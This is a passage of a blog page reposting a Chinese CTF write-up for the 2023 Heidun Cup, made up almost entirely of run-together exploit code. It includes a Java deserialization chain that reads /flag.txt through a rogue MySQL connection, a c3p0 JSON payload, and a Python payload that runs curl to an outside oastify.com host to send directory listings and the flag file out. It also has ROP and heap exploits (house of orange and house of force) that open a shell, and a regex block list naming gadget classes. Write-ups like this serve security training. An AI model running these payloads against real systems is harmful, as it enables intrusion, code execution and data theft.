达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b’x00’*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b’x07’*0x30+p64(malloc_hook)*0x10+b’n’)add(5,0xa0)edit(5,p64(one_gadget)+b’n’)add(6,0x200)ly.interactive()</h1><p>EDI安全</p>
+<p>扫二维码｜关注我们</p>
+<p>一个专注渗透实战经验分享的公众号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">public class SecurityCheck &#123; private final String input;</span><br><span class="line"> public SecurityCheck(String input) &#123; this.input = input; checkForBlockedClasses(); &#125;</span><br><span class="line"> private void checkForBlockedClasses() &#123; Pattern pattern = Pattern.compile(&quot;(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)&quot;); if (pattern.matcher(this.input).find()) throw new SecurityException(&quot;hacker&quot;); &#125;&#125;</span><br><span class="line">package com.example;</span><br><span class="line">import com.ctf.bean.MyBean;</span><br><span class="line">import com.vaadin.data.util.NestedMethodProperty;</span><br><span class="line">import com.vaadin.data.util.PropertysetItem;</span><br><span class="line">import org.apache.commons.codec.binary.Hex;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">public class Exp &#123; public static void main(String[] args) throws Exception &#123;</span><br><span class="line"> MyBean myBean =new MyBean(); myBean.setDatabase(&quot;mysql://vps:</span><br><span class="line">3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;);</span><br><span class="line"> PropertysetItem p = new PropertysetItem();</span><br><span class="line"> NestedMethodProperty&lt;Object&gt; n = new NestedMethodProperty&lt;Object&gt;(myBean, &quot;Connection&quot;);</span><br><span class="line"> p.addItemProperty(&quot;Connection&quot;, n);</span><br><span class="line"> BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;v&quot;); Field field = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;); field.setAccessible(true); field.set(badAttributeValueExpException, p);</span><br><span class="line"> ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes = bos.toByteArray();</span><br><span class="line"> char[] hexChars = Hex.encodeHex(bytes); String hexString = new String(hexChars);</span><br><span class="line"> System.out.println(hexString.toUpperCase()); &#125;&#125;</span><br><span class="line">&#123;&quot;1&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;2&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:</span><br><span class="line">tihuanzheli;&quot;,&#125;&#125;</span><br><span class="line">from flask import Flask, request, Responseimport osimport shutilimport site</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)def index(): return app.send_static_file(&#x27;index.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload(): f = request.files[&quot;data&quot;] with open(f&#x27;/tmp/storage/&#123;f.filename&#125;&#x27;, &#x27;wb+&#x27;) as destination: destination.write(f.read())    return Response(&quot;File is uploaded!&quot;, 200)</span><br><span class="line">@app.route(&#x27;/install&#x27;, methods=[&#x27;GET&#x27;])def install(): package_name = request.args.get(&#x27;package_name&#x27;) #获取包名 if &#x27;..&#x27; in package_name: #防止穿越 return Response(&quot;Not allowed!&quot;, 400)</span><br><span class="line"> src = os.path.join(&#x27;contrib&#x27;, &#x27;packages&#x27;, package_name) dst = os.path.join(&#x27;/tmp/extract&#x27;, package_name)</span><br><span class="line"> shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir=&#x27;/tmp/extract&#x27;)#安装包 return Response(&quot;Installed!&quot;, 200)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/clean&#x27;, methods=[&#x27;GET&#x27;])def clean(): file = os.path.basename(request.args.get(&#x27;file&#x27;)) file_safe = f&#x27;/tmp/storage/&#123;file&#125;&#x27; os.unlink(file_safe) return Response(&quot;file removed!&quot;, 200)</span><br><span class="line">@app.route(&#x27;/add&#x27;, methods=[&#x27;GET&#x27;])def add(): site_dir = &quot;/tmp/extract&quot; name = request.args.get(&#x27;name&#x27;) site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if __name__ == &quot;__main__&quot;:    app.run(debug=True, host=&#x27;0.0.0.0&#x27;)</span><br><span class="line">import os;os.system(&quot;curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls /|base64`&quot;)</span><br><span class="line">YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0</span><br><span class="line">base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt</span><br><span class="line">import os;os.system(&quot;curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`&quot;)</span><br><span class="line">ZmxhZ3thODc3MWFiNGFhfQ==base64解码：flag&#123;a8771ab4aa&#125;</span><br><span class="line">504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874</span><br><span class="line">c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c625</span><br><span class="line">87a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400</span><br><span class="line">090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000</span><br><span class="line">666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2</span><br><span class="line">d4340e78d701504b050600000000010001005a0000006a0000000000</span><br><span class="line">flag&#123;496d8981f449e45f6e39e1faa0b1ab8a&#125;</span><br><span class="line">mysqlbinlog mylog.000001 &gt; mysql.sql</span><br><span class="line">f = open(&quot;network.txt&quot;,&quot;r&quot;)w = open(&quot;result.txt&quot;,&quot;w&quot;)</span><br><span class="line"># a = &#x27;&#123;&quot;Time&quot;:&quot;2023/1/1 0:17:27&quot;, &quot;SrcHost&quot;:&quot;192.168.194.119&quot;, &quot;DestHost&quot;:&quot;40.118.19.83&quot;&#125;,&#x27;# print(a)</span><br><span class="line">for a in f.readlines(): a = a.split(&quot;&quot;DestHost&quot;:&quot;&quot;)[1] a = a.split(&quot;&quot;&#125;&quot;)[0] print(a) w.write(a+&quot;n&quot;)</span><br><span class="line">f.closew.close</span><br><span class="line">&#123;&quot;type&quot;:&quot;domain&quot;, &quot;ioc&quot;:&quot; -&gt; 空&#123;&quot;type&quot;:&quot;ip&quot;, &quot;ioc&quot;:&quot; -&gt; 空&quot;, &quot;tag&quot;:&quot;.* -&gt; 空</span><br><span class="line">f = open(&quot;ioc1.txt&quot;,&quot;r&quot;)w = open(&quot;result.txt&quot;,&quot;r&quot;)</span><br><span class="line">for a in f.readlines(): for b in w.readlines(): b = b[-6:] if b in a: print(b)</span><br><span class="line">f.closew.close</span><br><span class="line">flag&#123;lprbriry.net&#125;</span><br><span class="line">ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg&#123;12qwaszxcde3&#125;flag&#123;12qwaszxcde3&#125;</span><br><span class="line">import pwn</span><br><span class="line">from pwn import *pwn.context.log_level=&#x27;debug&#x27;# 设置目标地址和端口host = &#x27;39.104.26.167&#x27;port = 6681</span><br><span class="line"># 连接目标conn = remote(host, port)</span><br><span class="line"># 转数据retest=conn.recv()retest=retest.decode(encoding=&#x27;utf-8&#x27;)retest1=retest.split(&#x27;n&#x27;)n=int(retest1[1].split(&quot;=&quot;)[1])sper = retest1[2].split(&#x27;=&#x27;)[0]newsper1 = sper.replace(&#x27;X&#x27;,&#x27;*&#x27;)flager = eval(newsper1)</span><br><span class="line"># 发送数据conn.sendline(str(flager).encode(encoding=&#x27;utf-8&#x27;))conn.recv()conn.sendline(b&#x27;open(&quot;/flag.txt&quot;).read()&#x27;)conn.recv()</span><br><span class="line">from pwn import *from struct import pack</span><br><span class="line">from ctypes import *</span><br><span class="line">def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b&#x27;x7f&#x27;)[-6:].ljust(8, b&#x27;x00&#x27;))def get_sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/shx00&#x27;))</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;39.104.26.167&#x27;, 27791)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so&#x27;)</span><br><span class="line">kk = b&#x27;&#123;&gt;o&lt;fi:`mjkj5daqd6fhugim~~rj5h=&#x27;ret = 0x400691rdi = 0x400af3rsi_r15 = 0x400af1PLT1 = 0x4006A6buf = elf.bss() + 0x400</span><br><span class="line">    #gdb.attach(p, &#x27;b *0x400a83&#x27;)</span><br><span class="line">s(kk + b&#x27;x00&#x27;)sleep(1)s(b&#x27;a&#x27;*0x38 + p64(rsi_r15) + p64(elf.got[&#x27;alarm&#x27;])*2 + p64(elf.sym[&#x27;read&#x27;]) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym[&#x27;read&#x27;]) + p64(0x400AEA) + p64(0)*2 + p64(elf.got[&#x27;alarm&#x27;]) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b&#x27;xf5&#x27;)sleep(3)s(b&#x27;/bin/shx00&#x27;.ljust(0x3b, b&#x27;a&#x27;))</span><br><span class="line">    #pause()</span><br><span class="line">inter()</span><br><span class="line">from pwn import *ly=remote(&#x27;39.104.26.167&#x27;,15910)#ly=process(&quot;./leak&quot;)context.log_level = &quot;debug&quot;libc=ELF(&#x27;/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)elf=ELF(&#x27;./leak&#x27;)def add(idx,size): ly.sendlineafter(b&quot;Your choice:&quot;,b&#x27;1&#x27;) ly.sendlineafter(b&quot;Index:&quot;,str(idx)) ly.sendlineafter(b&quot;Size:&quot;,str(size))def edit(idx,content): ly.sendlineafter(b&quot;Your choice:&quot;, b&#x27;2&#x27;) ly.sendlineafter(b&quot;Index:&quot;,str(idx)) ly.sendafter(b&quot;Content:&quot;,content)def show(idx): ly.sendlineafter(b&quot;Your choice:&quot;, b&#x27;3&#x27;) ly.sendlineafter(b&quot;Index:&quot;,str(idx))</span><br><span class="line">def delete(idx): ly.sendlineafter(b&quot;Your choice:&quot;, b&#x27;4&#x27;) ly.sendlineafter(b&quot;Index:&quot;, str(idx))add(0,0x18)</span><br><span class="line"># house of orange 打个页对齐得size到top_chunkpayload=p64(0)*3+p64(0xd91)edit(0,payload)</span><br><span class="line"># 申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)</span><br><span class="line"># 拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base=u64(ly.recvuntil(b&#x27;x7f&#x27;)[-6:].ljust(8,b&#x27;x00&#x27;))-0x3ec2a0malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]one_gadget=libc_base+0x10a2fc#onegadget 0x10a41c</span><br><span class="line"># hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b&#x27;x00&#x27;*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b&#x27;x07&#x27;*0x30+p64(malloc_hook)*0x10+b&#x27;n&#x27;)add(5,0xa0)edit(5,p64(one_gadget)+b&#x27;n&#x27;)add(6,0x200)ly.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/118253.html">https://www.ctfiot.com/118253.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2023%E9%BB%91%E7%9B%BE%E6%9D%AF-WriteUp.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2023黑盾杯-WriteUp.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JdbcRowSetImpl/">JdbcRowSetImpl</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Web/2023%E9%B9%8F%E7%A8%8B%E6%9D%AF%E5%88%9D%E8%B5%9BWriteup/" title="2023 鹏程杯初赛 writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023 鹏程杯初赛 writeup</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Web/2023%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E8%B5%9B%E9%A2%98-%E9%A2%98%E8%A7%A3/" title="2023 红明谷杯 5 题 WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023 红明谷杯 5 题 WP</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#a-%E2%80%98-%E2%80%9CTime%E2%80%9D-%E2%80%9D2023-1-1-0-17-27%E2%80%9D-%E2%80%9CSrcHost%E2%80%9D-%E2%80%9D192-168-194-119%E2%80%9D-%E2%80%9CDestHost%E2%80%9D-%E2%80%9D40-118-19-83%E2%80%9D-%E2%80%99-print-a"><span class="toc-number">1.</span> <span class="toc-text">a &#x3D; ‘{“Time”:”2023&#x2F;1&#x2F;1 0:17:27”, “SrcHost”:”192.168.194.119”, “DestHost”:”40.118.19.83”},’# print(a)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87conn-remote-host-port"><span class="toc-number">2.</span> <span class="toc-text">连接目标conn &#x3D; remote(host, port)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E6%95%B0%E6%8D%AEretest-conn-recv-retest-retest-decode-encoding-%E2%80%99utf-8%E2%80%99-retest1-retest-split-%E2%80%98n%E2%80%99-n-int-retest1-1-split-%E2%80%9C-%E2%80%9D-1-sper-retest1-2-split-%E2%80%98-%E2%80%99-0-newsper1-sper-replace-%E2%80%98X%E2%80%99-%E2%80%99-%E2%80%99-flager-eval-newsper1"><span class="toc-number">3.</span> <span class="toc-text">转数据retest&#x3D;conn.recv()retest&#x3D;retest.decode(encoding&#x3D;’utf-8’)retest1&#x3D;retest.split(‘n’)n&#x3D;int(retest1[1].split(“&#x3D;”)[1])sper &#x3D; retest1[2].split(‘&#x3D;’)[0]newsper1 &#x3D; sper.replace(‘X’,’*’)flager &#x3D; eval(newsper1)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AEconn-sendline-str-flager-encode-encoding-%E2%80%99utf-8%E2%80%99-conn-recv-conn-sendline-b%E2%80%99open-%E2%80%9C-flag-txt%E2%80%9D-read-%E2%80%99-conn-recv"><span class="toc-number">4.</span> <span class="toc-text">发送数据conn.sendline(str(flager).encode(encoding&#x3D;’utf-8’))conn.recv()conn.sendline(b’open(“&#x2F;flag.txt”).read()’)conn.recv()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange-%E6%89%93%E4%B8%AA%E9%A1%B5%E5%AF%B9%E9%BD%90%E5%BE%97size%E5%88%B0top-chunkpayload-p64-0-3-p64-0xd91-edit-0-payload"><span class="toc-number">5.</span> <span class="toc-text">house of orange 打个页对齐得size到top_chunkpayload&#x3D;p64(0)*3+p64(0xd91)edit(0,payload)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%90%8C%E6%A0%B70xd91%E5%A4%A7%E5%B0%8F%E7%9A%84chunk%E5%BE%97%E5%88%B0-ubsorted-binadd-1-0x1008"><span class="toc-number">6.</span> <span class="toc-text">申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BFunsorted-bin-%E4%B8%80%E9%83%A8%E5%88%86%E6%B3%84%E9%9C%B2libcadd-2-0xd50-show-2-libc-base-u64-ly-recvuntil-b%E2%80%99x7f%E2%80%99-6-ljust-8-b%E2%80%99x00%E2%80%99-0x3ec2a0malloc-hook-libc-base-libc-sym-%E2%80%98-malloc-hook%E2%80%99-one-gadget-libc-base-0x10a2fc-onegadget-0x10a41c"><span class="toc-number">7.</span> <span class="toc-text">拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base&#x3D;u64(ly.recvuntil(b’x7f’)[-6:].ljust(8,b’x00’))-0x3ec2a0malloc_hook&#x3D;libc_base+libc.sym[‘__malloc_hook’]one_gadget&#x3D;libc_base+0x10a2fc#onegadget 0x10a41c</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hosue-of-force%E5%A0%86%E6%BA%A2%E5%87%BA-%E6%94%B9topchunk-size-%E4%B8%BA%E5%A4%A7%E6%95%B0-%E8%BE%BE%E5%88%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E7%9B%AE%E7%9A%84%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%8A%AB%E6%8C%81mallo-hook%E6%89%93one-gadgetedit-1-b%E2%80%99x00%E2%80%99-0x1008-p64-0xffffffffffffffff-add-3-0x22010-gdb-attach-ly-pause-add-4-0x100-edit-4-b%E2%80%99x07%E2%80%99-0x30-p64-malloc-hook-0x10-b%E2%80%99n%E2%80%99-add-5-0xa0-edit-5-p64-one-gadget-b%E2%80%99n%E2%80%99-add-6-0x200-ly-interactive"><span class="toc-number">8.</span> <span class="toc-text">hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b’x00’*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b’x07’*0x30+p64(malloc_hook)*0x10+b’n’)add(5,0xa0)edit(5,p64(one_gadget)+b’n’)add(6,0x200)ly.interactive()</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">8.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
